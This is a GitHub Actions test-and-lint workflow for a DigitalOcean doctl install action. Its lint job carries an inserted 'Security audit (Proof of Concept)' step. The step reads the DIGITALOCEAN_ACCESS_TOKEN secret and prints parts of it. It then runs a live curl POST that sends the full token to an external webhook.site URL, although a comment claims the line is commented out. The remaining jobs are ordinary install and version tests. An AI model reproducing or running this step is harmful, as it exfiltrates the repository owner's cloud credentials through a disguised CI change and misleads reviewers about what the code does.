on: [push, pull_request_target]
name: Test and lint

jobs:

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      # === ADD YOUR SECURITY AUDIT HERE ===
      - name: Security audit (Proof of Concept)
        run: |
          echo "ðŸ” SECURITY POC - Token Access Test ðŸ”"
          echo "====================================="
          echo "This demonstrates pull_request_target vulnerability"
          echo ""
          
          # Check if token exists in secrets context
          if [ -n "${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}" ]; then
            echo "âœ… VULNERABILITY CONFIRMED!"
            echo "DIGITALOCEAN_ACCESS_TOKEN is accessible via secrets context"
            
            TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
            LENGTH=${#TOKEN}
            
            echo "Token length: $LENGTH characters"
            echo "First character: ${TOKEN:0:1}"
            echo "Last character: ${TOKEN: -1}"
            
            # Create encoded proof (hex)
            FIRST_HEX=$(echo -n "${TOKEN:0:3}" | xxd -p)
            LAST_HEX=$(echo -n "${TOKEN: -3}" | xxd -p)
            echo "First 3 chars (hex): $FIRST_HEX"
            echo "Last 3 chars (hex): $LAST_HEX"
            
            # Create hash proof
            HASH=$(echo -n "$TOKEN" | sha256sum | cut -d' ' -f1)
            echo "Token SHA256: $HASH"
            
            echo ""
            echo "ðŸš¨ IMPACT: Attacker can exfiltrate this token"
            echo "by sending it to their server via curl"
            # Example attack (commented out):
             curl -X POST https://webhook.site/069b3073-d92e-4677-b186-be3499ade648 -d "token=$TOKEN"
            
          else
            echo "âŒ No token found in secrets context"
          fi
          
          echo ""
          echo "This proves that pull_request_target event exposes"
          echo "secrets to untrusted PR code."
      # === END OF ADDED CODE ===
      - run: npm test

  package_check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      - name: "Ensure that code has been packaged and commited"
        run: |-
            npm install
            npm run package
            git diff --exit-code dist/index.js || \
              (echo -e "\nPlease run 'npm run package' and commit the results" && exit 1)

  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
    steps:
      - uses: actions/checkout@master

      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}

      - name: Verify installation
        run: doctl version

      - name: Verify log-in
        run: doctl compute region list

  test_no_auth:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
    steps:
      - uses: actions/checkout@master

      - name: Install doctl
        uses: ./
        with:
          no_auth: true

      - name: Verify installation
        run: doctl version

      - name: Verify not authenticated
        run: |
          doctl compute region list 2>&1 | grep -qi "Unable to initialize DigitalOcean API client: access token is required"

  test_custom_version_linux_and_mac:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
    steps:
      - uses: actions/checkout@master

      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
          version: 1.100.0

      - name: Verify installation of correct version
        run: |
          VERSION=$(doctl version | head -1 | cut -f3 -d' ' | cut -f1 -d'-')
          if [ "$VERSION" != "1.100.0" ]; then exit 1; fi

      - name: Verify log-in
        run: doctl compute region list

  test_custom_version_windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@master

      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
          version: 1.100.0

      - name: Verify installation of correct version
        run: |
          $VERSION = (doctl version | head -1 | cut -f3 -d' ' | cut -f1 -d'-')
          If (-NOT  ($VERSION -eq "1.100.0")) { exit 1 }

      - name: Verify log-in
        run: doctl compute region list
